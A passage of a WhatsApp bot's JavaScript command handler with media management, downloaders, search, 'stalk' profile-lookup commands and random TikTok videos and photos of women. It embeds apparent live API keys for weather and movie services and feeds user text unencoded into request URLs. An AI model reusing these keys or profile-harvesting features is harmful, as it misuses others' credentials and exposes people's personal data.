            "./OctopusBotzzMedia/database/xeonvn.json",
            JSON.stringify(VoiceNoteXeon)
          );
          fs.unlinkSync(delb);
          replyLinkGc(`Success Adding Audio\nCheck by typing ${prefix}listvn`);
        }
        break;
      case "delvn":
        {
          if (!isCreator) return XeonStickOwner();
          if (args.length < 1) return replyLinkGc("Enter the vn name");
          if (!VoiceNoteXeon.includes(q))
            return replyLinkGc("The name does not exist in the database");
          let wanu = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(wanu, 1);
          fs.writeFileSync(
            "./OctopusBotzzMedia/database/xeonvn.json",
            JSON.stringify(VoiceNoteXeon)
          );
          fs.unlinkSync(`./OctopusBotzzMedia/audio/${q}.mp3`);
          replyLinkGc(`Success deleting vn ${q}`);
        }
        break;
      case "listvn":
        {
          let teks = "┌──⭓「 *VN List* 」\n│\n";
          for (let x of VoiceNoteXeon) {
            teks += `│⭔ ${x}\n`;
          }
          teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`;
          replyLinkGc(teks);
        }
        break;
      case "addzip":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1) return replyLinkGc(`What's the zip name?`);
          let teks = `${text}`;
          {
            if (ZipXeon.includes(teks))
              return replyLinkGc("This name is already in use");
            let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            ZipXeon.push(teks);
            await fsx.copy(delb, `./OctopusBotzzMedia/zip/${teks}.zip`);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/zip.json",
              JSON.stringify(ZipXeon)
            );
            fs.unlinkSync(delb);
            replyLinkGc(`Success Adding zip\nTo check type ${prefix}listzip`);
          }
        }
        break;
      case "delzip":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1)
            return replyLinkGc("Enter the text in the zip list");
          let teks = `${text}`;
          {
            if (!ZipXeon.includes(teks))
              return replyLinkGc("This name does not exist in the database");
            let wanu = ZipXeon.indexOf(teks);
            ZipXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/zip.json",
              JSON.stringify(ZipXeon)
            );
            fs.unlinkSync(`./OctopusBotzzMedia/zip/${teks}.zip`);
            replyLinkGc(`Successfully deleted zip ${teks}`);
          }
        }
        break;
      case "listzip":
        {
          let teksooooo = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let x of ZipXeon) {
            teksooooo += `│⭔ ${x}\n`;
          }
          teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`;
          replyLinkGc(teksooooo);
        }
        break;
      case "addapk":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1)
            return replyLinkGc("What is the name of the apk?");
          let teks = `${text}`;
          {
            if (ApkXeon.includes(teks))
              return replyLinkGc("This name is already in use");
            let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            apknye.push(teks);
            await fsx.copy(delb, `./OctopusBotzzMedia/apk/${teks}.apk`);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/apk.json",
              JSON.stringify(ApkXeon)
            );
            fs.unlinkSync(delb);
            replyLinkGc(
              `Successful Adding apk\nTo Check type ${prefix}listapk`
            );
          }
        }
        break;
      case "delapk":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1) return replyLinkGc("Name of the apk?");
          let teks = `${text}`;
          {
            if (!ApkXeon.includes(teks))
              return replyLinkGc("This name does not exist in the database");
            let wanu = ApkXeon.indexOf(teks);
            ApkXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/apk.json",
              JSON.stringify(ApkXeon)
            );
            fs.unlinkSync(`./OctopusBotzzMedia/apk/${teks}.apk`);
            replyLinkGc(`Successfully deleted Apk ${teks}`);
          }
        }
        break;
      case "listapk":
        {
          let teksoooooo = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let x of ApkXeon) {
            teksoooooo += `│⭔ ${x}\n`;
          }
          teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`;
          replyLinkGc(teksoooooo);
        }
        break;
      case "addpdf":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1)
            return replyLinkGc("What is the name of the pdf");
          let teks = `${text}`;
          {
            if (DocXeon.includes(teks))
              return replyLinkGc("This name is already in use");
            let delb = await OctopusBotzz.downloadAndSaveMediaMessage(quoted);
            DocXeon.push(teks);
            await fsx.copy(delb, `./OctopusBotzzMedia/doc/${teks}.pdf`);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/doc.json",
              JSON.stringify(DocXeon)
            );
            fs.unlinkSync(delb);
            replyLinkGc(
              `Successful Adding Pdf\nTo check type ${prefix}listpdf`
            );
          }
        }
        break;
      case "delpdf":
        {
          if (!isCreator) return XeonStickOwner();

          if (args.length < 1) return replyLinkGc("Enter the name");
          let teks = `${text}`;
          {
            if (!DocXeon.includes(teks))
              return replyLinkGc("This name does not exist in the database");
            let wanu = DocXeon.indexOf(teks);
            DocXeon.splice(wanu, 1);
            fs.writeFileSync(
              "./OctopusBotzzMedia/database/doc.json",
              JSON.stringify(DocXeon)
            );
            fs.unlinkSync(`./OctopusBotzzMedia/doc/${teks}.pdf`);
            replyLinkGc(`Successfully deleted pdf ${teks}`);
          }
        }
        break;
      case "listpdf":
        {
          let teksoooo = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let x of DocXeon) {
            teksoooo += `│⭔ ${x}\n`;
          }
          teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`;
          replyLinkGc(teksoooo);
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        OctopusBotzz_dev = await getBuffer(
          `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
        );
        await OctopusBotzz.sendMessage(
          m.chat,
          {
            audio: OctopusBotzz_dev,
            mimetype: "audio/mp4",
            ptt: true,
          },
          { quoted: m }
        );
        break;
      case "friend":
      case "searchfriend":
        {
          await XeonStickWait();
          let teman = pickRandom(xeonverifieduser);
          setTimeout(() => {}, 1000);
          setTimeout(() => {
            replyLinkGc("Managed to Get One Person");
          }, 5000);
          setTimeout(() => {
            OctopusBotzz.sendMessage(
              from,
              {
                text: `Here @${teman.split("@")[0]}`,
                mentions: [teman],
              },
              { quoted: m }
            );
          }, 9000);
        }
        break;
      case "q":
      case "quoted":
        {
          if (!m.quoted) return replyLinkGc("Reply the Message!!");
          let xeonquotx = await OctopusBotzz.serializeM(await m.getQuotedObj());
          if (!xeonquotx.quoted)
            return replyLinkGc(
              "The message you are replying to is not sent by the bot"
            );
          await xeonquotx.quoted.copyNForward(m.chat, true);
        }
        break;
      case "obfus":
      case "obfuscate":
        {
          if (!q)
            return replyLinkGc(
              `Example ${prefix + command} const xeonbot = require('baileys')`
            );
          let meg = await obfus(q);
          replyLinkGc(`Success
${meg.result}`);
        }
        break;
      case "style":
      case "styletext":
        {
          let { styletext } = require("./lib/scraper");
          if (!text) return replyLinkGc("Enter Query text!");
          let anu = await styletext(text);
          let teks = `Style Text From ${text}\n\n`;
          for (let i of anu) {
            teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`;
          }
          replyLinkGc(teks);
        }
        break;
      case "yts":
      case "ytsearch":
        {
          if (!text)
            return replyLinkGc(`Example : ${prefix + command} story wa anime`);
          let yts = require("yt-search");
          let search = await yts(text);
          let teks = "YouTube Search\n\n Result From " + text + "\n\n";
          let no = 1;
          for (let i of search.all) {
            teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${
              i.type
            }\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${
              i.title
            }\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${
              i.timestamp
            }\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${
              i.url
            }\n\n─────────────────\n\n`;
          }
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: search.all[0].thumbnail },
              caption: teks,
            },
            { quoted: m }
          );
        }
        break;
      case "play":
      case "song":
        {
          if (!text)
            return replyLinkGc(
              `Example : ${prefix + command} anime whatsapp status`
            );
          const xeonplaymp3 = require("./lib/ytdl");
          let yts = require("youtube-yts");
          let search = await yts(text);
          let anup3k = search.videos[0];
          const pl = await xeonplaymp3.mp3(anup3k.url);
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              audio: fs.readFileSync(pl.path),
              fileName: anup3k.title + ".mp3",
              mimetype: "audio/mp4",
              ptt: true,
              contextInfo: {
                externalAdReply: {
                  title: anup3k.title,
                  body: botname,
                  thumbnail: await fetchBuffer(pl.meta.image),
                  sourceUrl: websitex,
                  mediaType: 2,
                  mediaUrl: anup3k.url,
                },
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(pl.path);
        }
        break;
      case "ytmp3":
      case "ytaudio":
        let xeonaudp3 = require("./lib/ytdl");
        if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text))
          return replyLinkGc(
            `Where's the yt link?\nExample: ${
              prefix + command
            } https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
          );
        let audio = await xeonaudp3.mp3(text);
        await OctopusBotzz.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(audio.path),
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: {
              externalAdReply: {
                title: audio.meta.title,
                body: botname,
                thumbnail: await fetchBuffer(audio.meta.image),
                mediaType: 2,
                mediaUrl: text,
              },
            },
          },
          { quoted: m }
        );
        await fs.unlinkSync(audio.path);
        break;
      case "ytmp4":
      case "ytvideo":
        {
          const xeonvidoh = require("./lib/ytdl");
          if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text))
            replyLinkGc(
              `Where is the link??\n\nExample : ${
                prefix + command
              } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
            );
          const vid = await xeonvidoh.mp4(text);
          const ytc = `
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`;
          await OctopusBotzz.sendMessage(
            m.chat,
            {
              video: { url: vid.videoUrl },
              caption: ytc,
            },
            { quoted: m }
          );
        }
        break;
      case "git":
      case "gitclone":
        if (!args[0])
          return replyLinkGc(
            `Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/OctopusBotzzMedia`
          );
        if (!isUrl(args[0]) && !args[0].includes("github.com"))
          return replyLinkGc(`Link invalid!!`);
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
        let [, user, repo] = args[0].match(regex1) || [];
        repo = repo.replace(/.git$/, "");
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
        let filename = (await fetch(url, { method: "HEAD" })).headers
          .get("content-disposition")
          .match(/attachment; filename=(.*)/)[1];
        OctopusBotzz.sendMessage(
          m.chat,
          {
            document: { url: url },
            fileName: filename + ".zip",
            mimetype: "application/zip",
          },
          { quoted: m }
        ).catch((err) => replyLinkGc(mess.error));
        break;
      case "tiktok":
        {
          if (!q) return replyLinkGc(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replyLinkGc(`Link Invalid!!`);
          require("./lib/tiktok")
            .Tiktok(q)
            .then((data) => {
              OctopusBotzz.sendMessage(
                m.chat,
                {
                  caption: `Here you go!`,
                  video: { url: data.watermark },
                },
                { quoted: m }
              );
            });
        }
        break;
      case "tiktokaudio":
        {
          if (!q) return replyLinkGc(`Example : ${prefix + command} link`);
          if (!q.includes("tiktok")) return replyLinkGc(`Link Invalid!!`);
          require("./lib/tiktok")
            .Tiktok(q)
            .then((data) => {
              const xeontikmp3 = { url: data.audio };
              OctopusBotzz.sendMessage(
                m.chat,
                {
                  audio: xeontikmp3,
                  mimetype: "audio/mp4",
                  ptt: true,
                },
                { quoted: m }
              );
            });
        }
        break;
      case "google":
        {
          if (!q)
            return replyLinkGc(`Example : ${prefix + command} ${botname}`);
          await XeonStickWait();
          let google = require("google-it");
          google({ query: text }).then((res) => {
            let teks = `Google Search From : ${text}\n\n`;
            for (let g of res) {
              teks += `⭔ *Title* : ${g.title}\n`;
              teks += `⭔ *Description* : ${g.snippet}\n`;
              teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`;
            }
            replyLinkGc(teks);
          });
        }
        break;
      case "weather":
        {
          if (!text) return replyLinkGc("What location?");
          let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
          );
          let textw = "";
          textw += `*🗺️Weather of  ${text}*\n\n`;
          textw += `*Weather:-* ${wdata.data.weather[0].main}\n`;
          textw += `*Description:-* ${wdata.data.weather[0].description}\n`;
          textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`;
          textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`;
          textw += `*Pressure:-* ${wdata.data.main.pressure}\n`;
          textw += `*Humidity:-* ${wdata.data.main.humidity}\n`;
          textw += `*Humidity:-* ${wdata.data.wind.speed}\n`;
          textw += `*Latitude:-* ${wdata.data.coord.lat}\n`;
          textw += `*Longitude:-* ${wdata.data.coord.lon}\n`;
          textw += `*Country:-* ${wdata.data.sys.country}\n`;

          OctopusBotzz.sendMessage(
            m.chat,
            {
              text: textw,
            },
            {
              quoted: m,
            }
          );
        }
        break;
      case "fb":
      case "facebook":
        {
          if (!args[0]) {
            return replyLinkGc(
              `Please send the link of a Facebook video\n\nEXAMPLE :\n*${
                prefix + command
              }* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`
            );
          }
          const urlRegex =
            /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
          if (!urlRegex.test(args[0])) {
            return replyLinkGc("Url invalid");
          }
          try {
            const result = await fg.fbdl(args[0]);
            const tex = `
        [ FACEBOOK DL ]
${themeemoji} Title: ${result.title}`;
            const response = await fetch(result.videoUrl);
            const arrayBuffer = await response.arrayBuffer();
            const videoBuffer = Buffer.from(arrayBuffer);
            OctopusBotzz.sendMessage(
              m.chat,
              { video: videoBuffer, caption: tex },
              { quoted: m }
            );
          } catch (error) {
            replyLinkGc("Maybe private video!");
          }
        }
        break;
      case "tiktokstalk":
        {
          if (!text) return replyLinkGc(`Username? `);
          let res = await fg.ttStalk(args[0]);
          let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`;
          await OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: res.profile }, caption: txt },
            { quoted: m }
          );
        }
        break;
      case "xxxigstalk":
        {
          if (!text)
            return replyLinkGc(
              `Enter Instagram Username\n\nExample: ${
                prefix + command
              } unicorn_xeon13`
            );
          let res = await fg.igStalk(text);
          let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, "")}
└────────────`;
          await OctopusBotzz.sendMessage(
            m.chat,
            { image: { url: res.profilePic }, caption: te },
            { quoted: m }
          );
        }
        break;
      case "ghstalk":
      case "githubstalk":
        {
          if (!q) return replyLinkGc(`Example ${prefix + command} DGXeon`);
          await XeonStickWait();
          let githubstalk = require("./lib/scraper");
          aj = await githubstalk.githubstalk(`${q}`);
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: aj.profile_pic },
              caption: `*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}`,
            },
            { quoted: m }
          );
        }
        break;
      case "npmstalk":
        {
          if (!q) return replyLinkGc(`Example ${prefix + command} xeonapi`);
          await XeonStickWait();
          let npmstalk = require("./lib/scraper");
          eha = await npmstalk.npmstalk(q);
          replyLinkGc(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`);
        }
        break;
      case "ffstalk":
        {
          if (!q) return replyLinkGc(`Example ${prefix + command} 946716486`);
          await XeonStickWait();
          let ffstalk = require("./lib/scraper");
          eeh = await ffstalk.ffstalk(`${q}`);
          replyLinkGc(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`);
        }
        break;
      case "mlstalk":
        {
          if (!q)
            return replyLinkGc(`Example ${prefix + command} 530793138|8129`);
          await XeonStickWait();
          let mlstalk = require("./lib/scraper");
          let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1]);
          replyLinkGc(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`);
        }
        break;
      case "spotify":
        {
          if (!text) return replyLinkGc(`*Please enter a song name*`);
          try {
            const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(
              text
            )}`;
            const response = await fetch(apiUrl);
            if (!response.ok) {
              console.log("Error searching for song:", response.statusText);
              return replyLinkGc("Error searching for song");
            }
            const data = await response.json();
            const coverimage = data.spty.results.thumbnail;
            const name = data.spty.results.title;
            const slink = data.spty.results.url;
            const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(
              text
            )}`;
            const audioResponse = await fetch(dlapi);
            if (!audioResponse.ok) {
              console.log("Error fetching audio:", audioResponse.statusText);
              return replyLinkGc("Error fetching audio");
            }
            const audioBuffer = await audioResponse.buffer();
            const tempDir = os.tmpdir();
            const audioFilePath = path.join(tempDir, "audio.mp3");
            try {
              await fs.promises.writeFile(audioFilePath, audioBuffer);
            } catch (writeError) {
              console.error("Error writing audio file:", writeError);
              return replyLinkGc("Error writing audio file");
            }
            let doc = {
              audio: {
                url: audioFilePath,
              },
              mimetype: "audio/mpeg",
              ptt: true,
              waveform: [100, 0, 100, 0, 100, 0, 100],
              fileName: "dgxeon",
              contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                  title: `PLAYING TO ${name}`,
                  body: botname,
                  thumbnailUrl: coverimage,
                  sourceUrl: websitex,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                },
              },
            };
            await OctopusBotzz.sendMessage(m.chat, doc, {
              quoted: m,
            });
          } catch (error) {
            console.error("Error fetching Spotify data:", error);
            return replyLinkGc("*Error*");
          }
        }
        break;
      case "imdb":
        if (!text) return replyLinkGc(`_Name a Series or movie`);
        await XeonStickWait();
        let fids = await axios.get(
          `http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`
        );
        let imdbt = "";
        console.log(fids.data);
        imdbt +=
          "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "🎬Title      : " + fids.data.Title + "\n";
        imdbt += "📅Year       : " + fids.data.Year + "\n";
        imdbt += "⭐Rated      : " + fids.data.Rated + "\n";
        imdbt += "📆Released   : " + fids.data.Released + "\n";
        imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n";
        imdbt += "🌀Genre      : " + fids.data.Genre + "\n";
        imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n";
        imdbt += "✍Writer     : " + fids.data.Writer + "\n";
        imdbt += "👨Actors     : " + fids.data.Actors + "\n";
        imdbt += "📃Plot       : " + fids.data.Plot + "\n";
        imdbt += "🌐Language   : " + fids.data.Language + "\n";
        imdbt += "🌍Country    : " + fids.data.Country + "\n";
        imdbt += "🎖️Awards     : " + fids.data.Awards + "\n";
        imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n";
        imdbt += "🏙️Production : " + fids.data.Production + "\n";
        imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n";
        imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + "";
        OctopusBotzz.sendMessage(
          m.chat,
          {
            image: {
              url: fids.data.Poster,
            },
            caption: imdbt,
          },
          {
            quoted: m,
          }
        );
        break;
      case "ebinary":
        {
          if (!q)
            return replyLinkGc(
              `Send/reply text with captions ${prefix + command}`
            );
          let { eBinary } = require("./lib/binary");
          let eb = await eBinary(`${q}`);
          replyLinkGc(eb);
        }
        break;
      case "dbinary":
        {
          if (!q)
            return replyLinkGc(
              `Send/reply text with captions ${prefix + command}`
            );
          let { dBinary } = require("./lib/binary");
          let db = await dBinary(`${q}`);
          replyLinkGc(db);
        }
        break;
      case "happymod":
        {
          if (!q)
            return replyLinkGc(`Example ${prefix + command} Sufway surfer mod`);
          await XeonStickWait();
          let kat = await scp2.happymod(q);
          replyLinkGc(util.format(kat));
        }
        break;
      case "gdrive":
        {
          if (!args[0]) return replyLinkGc(`Enter the Google Drive link`);
          await XeonStickWait();
          const fg = require("api-dylux");
          try {
            let res = await fg.GDriveDl(args[0]);
            await replyLinkGc(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`);
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: { url: res.downloadUrl },
                fileName: res.fileName,
                mimetype: res.mimetype,
              },
              { quoted: m }
            );
          } catch {
            replyLinkGc("Error: Check link or try another link");
          }
        }
        break;
      case "pinterest":
        {
          if (!text) return replyLinkGc(`Enter Query`);
          let { pinterest } = require("./lib/scraper");
          anutrest = await pinterest(text);
          result = anutrest[Math.floor(Math.random() * anutrest.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              image: { url: result },
              caption: "⭔ Media Url : " + result,
            },
            { quoted: m }
          );
        }
        break;
      case "ringtone":
        {
          if (!text)
            return replyLinkGc(`Example : ${prefix + command} black rover`);
          let ringtone = require("./lib/scraper");
          let anutone2 = await ringtone(text);
          let result = anutone2[Math.floor(Math.random() * anutone2.length)];
          OctopusBotzz.sendMessage(
            m.chat,
            {
              audio: { url: result.audio },
              fileName: result.title + ".mp3",
              mimetype: "audio/mpeg",
            },
            { quoted: m }
          );
        }
        break;
      case "tiktokgirl":
        await XeonStickWait();
        var asupan = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/tiktokgirl.json")
        );
        var hasil = pickRandom(asupan);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokghea":
        await XeonStickWait();
        var gheayubi = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/gheayubi.json")
        );
        var hasil = pickRandom(gheayubi);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokbocil":
        await XeonStickWait();
        var bocil = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/bocil.json")
        );
        var hasil = pickRandom(bocil);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknukhty":
        await XeonStickWait();
        var ukhty = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/ukhty.json")
        );
        var hasil = pickRandom(ukhty);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoksantuy":
        await XeonStickWait();
        var santuy = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/santuy.json")
        );
        var hasil = pickRandom(santuy);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokkayes":
        await XeonStickWait();
        var kayes = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/kayes.json")
        );
        var hasil = pickRandom(kayes);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokpanrika":
        await XeonStickWait();
        var rikagusriani = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/panrika.json")
        );
        var hasil = pickRandom(rikagusriani);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknotnot":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokvids/notnot.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "chinese":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/china.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "hijab":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/hijab.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "indo":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/indonesia.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "japanese":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/japan.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "korean":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/korea.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "malay":
        await XeonStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./assets/database/media/tiktokpics/malaysia.json")
        );
        var hasil = pickRandom(notnot);
        OctopusBotzz.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomgirl":
